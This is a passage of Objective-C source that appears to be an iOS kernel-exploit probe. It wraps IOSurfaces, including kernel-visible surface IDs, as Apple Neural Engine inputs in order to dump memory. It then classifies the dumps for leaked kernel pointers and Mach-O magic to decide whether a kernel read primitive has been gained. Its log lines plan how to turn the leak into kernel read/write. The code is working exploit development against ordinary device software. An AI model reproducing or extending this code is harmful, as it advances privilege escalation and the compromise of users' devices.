                p082_fill_u16(ins[i].surf, dirTile[i]);
                id obj = p082_wrap(ins[i].surf);
                if (!obj) {
                    p082_log(@"[-] Direct wrap failed at %u", i);
                    inObjs = nil;
                    break;
                }
                [inObjs addObject:obj];
                [inIdx addObject:@(i)];
            }
            id oobj = p082_wrap(outS);
            if (inObjs.count == P082_N_IN && oobj) {
                dirOk = p082_direct_fire(aneModel, inObjs, inIdx, oobj, outS,
                                         yDir, sizeof(yDir), &d);
                scDir = p082_scan(yDir, sizeof(yDir), NULL, 0, dirTile, P082_N_IN);
                p082_log(@"[*] D-DIR class=%@", p082_class_name(scDir, 0));
                p082_log(@"    kptr=%u magic=%u tileCtrl=%u/127 zeroQ=%u",
                         scDir.nKptr, scDir.nMagic, scDir.nTileCtrl, scDir.nZero);
                p082_hexdump(yDir, sizeof(yDir), 64);
                p082_write_bin(@"p082_direct_out.bin", yDir, sizeof(yDir));
            } else {
                p082_log(@"[-] Direct wrap incomplete in=%lu out=%d",
                         (unsigned long)inObjs.count, oobj != nil);
            }
        }
    }

    /* ---- D-DIR-HIT: wrap any Lookup-visible sid in 1..127 as input[0] ---- */
    p082_log(@"--- PHASE D-DIR-HIT: wrap Lookup-visible sids 1..127 as Direct inputs ---");
    uint32_t nHitWrap = 0;
    IOSurfaceRef hitRefs[8];
    uint32_t hitSids[8];
    memset(hitRefs, 0, sizeof(hitRefs));
    for (uint32_t sid = 1; sid <= 127 && nHitWrap < 8; sid++) {
        IOSurfaceRef f = s_iosLookup(sid);
        if (!f) continue;
        hitRefs[nHitWrap] = f;
        hitSids[nHitWrap] = sid;
        nHitWrap++;
    }
    if (nHitWrap == 0) {
        p082_log(@"[*] D-DIR-HIT none — cannot wrap kernel/pre-boot sids (Lookup NULL).");
        p082_log(@"    Direct pixel DMA of fetched IOMD stays blocked on wrap.");
    } else if (aneModel) {
        p082_log(@"[*] D-DIR-HIT wrapping %u visible sids (first=%u)", nHitWrap, hitSids[0]);
        NSMutableArray *inObjs = [NSMutableArray arrayWithCapacity:P082_N_IN];
        NSMutableArray *inIdx = [NSMutableArray arrayWithCapacity:P082_N_IN];
        BOOL wrapOk = YES;
        for (uint32_t i = 0; i < P082_N_IN; i++) {
            IOSurfaceRef src = (i < nHitWrap) ? hitRefs[i] : ins[i].surf;
            id obj = p082_wrap(src);
            if (!obj) { wrapOk = NO; break; }
            [inObjs addObject:obj];
            [inIdx addObject:@(i)];
        }
        id oobj = p082_wrap(outS);
        uint8_t yHit[P082_Y_BYTES];
        memset(yHit, 0, sizeof(yHit));
        if (wrapOk && oobj) {
            BOOL ok = p082_direct_fire(aneModel, inObjs, inIdx, oobj, outS,
                                       yHit, sizeof(yHit), &d);
            p082_scan_t scHit = p082_scan(yHit, sizeof(yHit), NULL, 0, NULL, 0);
            p082_log(@"[*] D-DIR-HIT ok=%d class=%@", ok, p082_class_name(scHit, 0));
            p082_log(@"    kptr=%u magic=%u magicAt0=%d zeroQ=%u",
                     scHit.nKptr, scHit.nMagic, scHit.magicAt0, scHit.nZero);
            p082_hexdump(yHit, sizeof(yHit), 64);
            p082_write_bin(@"p082_direct_hit.bin", yHit, sizeof(yHit));
            if (scHit.magicAt0 || scHit.nKptr >= 2) {
                p082_log(@"[!] Direct HIT dump is a live global surface read.");
                p082_log(@"    hasKread stays NO until kread32(kbase)==0xfeedfacf.");
            }
        }
    }
    for (uint32_t i = 0; i < nHitWrap; i++) if (hitRefs[i]) CFRelease(hitRefs[i]);

    /* ---- verdict ---- */
    p082_log(@"=== VERDICT ===");
    p082_log(@"D-CTL  (CoreML, x_i=OUR sids, 0xA5 tiles): %@", p082_class_name(scCtl, P082_N_IN));
    p082_log(@"D-FETCH(CoreML, x_i=%u.. padded 127):     %@", dumpSids[0], p082_class_name(scDump, P082_N_IN));
    p082_log(@"D-SID1 (CoreML, all x_i=%u):              %@", dumpSids[0], p082_class_name(scOne, P082_N_IN));
    p082_log(@"D-DIR  (Direct wrap OUR unique tiles):     %@", p082_class_name(scDir, 0));
    p082_log(@"Lookup 1..127 pre=%u post=%u. Direct wrap of kernel sids requires a HIT.",
             hitBefore, hitAfter);

    int maybeText = scDump.magicAt0 || scOne.magicAt0;
    int kptrLeak = (scDump.nKptr >= 2) || (scOne.nKptr >= 2);
    int valueEcho = (scDump.nFp16Sid * 2 >= P082_N_IN);
    int contentOurs = (scCtl.nA5 >= 64);
    int dirIdentity = (scDir.nTileCtrl >= 8);

    if (maybeText) {
        p082_log(@"IOMD_MAYBE_TEXT: MH_MAGIC at the start of a fetched-sid dump.");
        p082_log(@"That is a read of that IOMD. It is kread32(kbase)==0xfeedfacf");
        p082_log(@"ONLY if the backing is kernel TEXT. Do not flip hasKread from");
        p082_log(@"one 512-byte window — need repeatable kread32 at kbase.");
        [[P007Board shared] recordEvent:@"p082_session" kind:@"iomd_maybe_text"
                                 detail:[NSString stringWithFormat:@"sid=%u", dumpSids[0]]
                                 source:@"p082"];
    } else if (kptrLeak) {
        p082_log(@"IOMD_KPTR: 0xfffffff0… in the copyout of fetched sids.");
        p082_log(@"Live global surface dump. Backing is an IOMD, not proven TEXT.");
        p082_log(@"hasKread=NO. Next: re-aim at a TEXT-backed sid if one exists,");
        p082_log(@"or convert this leak via SocketKRW after a kptr dest is named.");
        [[P007Board shared] recordEvent:@"p082_session" kind:@"iomd_kptr"
                                 detail:[NSString stringWithFormat:@"kptr=%u", scDump.nKptr]
                                 source:@"p082"];
    } else if (valueEcho && !contentOurs) {
        p082_log(@"VALUE_ECHO: copyout y is fp16(x_i). Espresso used the MultiArray");
        p082_log(@"VALUES as the tensor; fetched IOMD CONTENT was not read (P080).");
        p082_log(@"Direct identity=%s. Fetch (0x9867f18) still stands; the dump",
                 dirIdentity ? "YES" : "NO");
        p082_log(@"door on the CoreML binding is closed. Next: a wrap of a Lookup");
        p082_log(@"HIT, or Door B consume-forge (v72 guest Direct-B overlap).");
        [[P007Board shared] recordEvent:@"p082_session" kind:@"value_echo"
                                 detail:@"copyout fp16(sid)" source:@"p082"];
    } else if (contentOurs) {
        p082_log(@"CONTENT_READ: ANE read OUR 0xA5 tiles on the CoreML binding.");
        p082_log(@"Then D-FETCH bytes are that IOMD's pixels. Classify D-FETCH");
        p082_log(@"above. hasKread stays NO without MH_MAGIC at kbase.");
        [[P007Board shared] recordEvent:@"p082_session" kind:@"content_read"
                                 detail:p082_class_name(scDump, P082_N_IN)
                                 source:@"p082"];
    } else {
        p082_log(@"No TEXT magic, no kptr cluster, no clean value-echo.");
        p082_log(@"Paste SESSION START through VERDICT. hasKread=NO.");
        [[P007Board shared] recordEvent:@"p082_session" kind:@"unclassified"
                                 detail:p082_class_name(scDump, P082_N_IN)
                                 source:@"p082"];
    }
    p082_log(@"Honesty: conversion bar untouched. hasKread=NO hasKwrite=NO.");
    p082_log(@"One TAP per force-quit. Reboot before this TAP (isolation).");
    p082_log(@"Do not tap P044/P088/P099/P076 on this boot.");

    p082_finish(ins, made, outS);
    return p082_return();
}

@end
